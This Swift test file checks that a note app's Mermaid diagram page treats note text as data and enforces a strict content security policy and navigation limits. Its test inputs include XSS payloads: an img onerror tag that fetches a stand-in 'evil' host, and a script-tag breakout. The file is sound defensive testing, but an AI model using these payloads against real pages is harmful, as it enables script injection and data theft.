import Foundation
import WebKit
import CoreRenderers

/// A mermaid block's text comes from the note — possibly a vault someone else
/// wrote — so it must reach mermaid as data, never as markup the page runs.
func mermaidPageChecks() {
    let nonce = "N0nce"
    func page(_ source: String) -> String { MermaidPage.html(source: source, nonce: nonce) }

    let img = page("graph TD\nA[<img src=x onerror=\"fetch('https://evil/')\">]")
    expect(!img.contains("<img"), "note text never lands in the page as an HTML tag")

    let breakout = page("</script><script>alert(1)</script>")
    expect(!breakout.contains("<script>alert"), "a closing script tag can't break out of the data literal")

    let comment = page("<!--<script>")
    expect(!comment.contains("<!--"), "no raw `<` from the note reaches the script block at all")

    let plain = page("graph TD; A-->B")
    expect(plain.contains("\"graph TD; A-->B\""), "ordinary diagram text is passed through as a string literal")

    expect(plain.contains("default-src 'none'"), "a CSP denies everything not listed")
    expect(plain.contains("'nonce-\(nonce)'"), "only nonce-tagged inline script runs")
    let scriptSrc = plain.components(separatedBy: "script-src").dropFirst().first?
        .prefix(while: { $0 != ";" && $0 != "\"" }) ?? ""
    expect(!scriptSrc.isEmpty && !scriptSrc.contains("unsafe-inline"),
           "script-src doesn't allow inline event handlers")
    expect(!plain.contains("connect-src"), "no fetch/XHR/WebSocket destinations are allowed")
    expect(plain.contains("mermaid@10.9.8/"), "mermaid is pinned to an exact version")
    expect(plain.contains("integrity=\"sha384-"), "and loaded with a subresource integrity hash")
    expect(plain.contains("securityLevel: 'strict'"), "mermaid runs in strict mode")

    let base = MermaidPage.baseURL
    expect(MermaidPage.allowsNavigation(to: base, type: .other), "the initial HTML load is allowed")
    expect(!MermaidPage.allowsNavigation(to: URL(string: "https://evil.example/"), type: .other),
           "script can't navigate the view anywhere else")
    expect(!MermaidPage.allowsNavigation(to: base, type: .linkActivated), "a clicked link doesn't navigate")
    expect(!MermaidPage.allowsNavigation(to: nil, type: .other), "an unknown target is refused")
}
